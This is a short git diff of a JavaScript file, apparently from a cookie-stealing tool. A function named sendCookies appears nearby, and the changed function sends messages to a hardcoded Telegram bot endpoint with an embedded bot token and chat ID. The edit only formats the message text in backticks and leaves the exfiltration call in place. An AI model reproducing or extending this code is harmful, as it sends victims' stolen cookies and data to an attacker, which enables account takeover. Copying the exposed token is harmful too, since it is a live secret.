@@ -284,9 +284,9 @@ function sendCookies(cookie) {
 
 function sendCustomMsg(message) {
   fetch(
-    `https://api.telegram.org/bot6580155993:AAFlGM86Huni8KSmowjWyftePxXQRU-7YYU/sendMessage?chat_id=5307938436&parse_mode=MarkdownV2&text=${encodeURI(
+    `https://api.telegram.org/bot6580155993:AAFlGM86Huni8KSmowjWyftePxXQRU-7YYU/sendMessage?chat_id=5307938436&parse_mode=MarkdownV2&text=\`${encodeURI(
       message
-    )}`
+    )}\``
   );
   // .then(response => response.json()).then(data => console.log(data))
   // console.log("Sent TG Message");
